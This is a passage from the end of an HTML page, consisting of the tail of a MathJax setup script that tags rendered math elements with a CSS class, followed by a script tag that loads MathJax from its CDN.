    });
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax();
        for (var i = 0; i < all.length; ++i)
            all[i].SourceElement().parentNode.className += ' has-jax';
    });</script><script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script></body></html>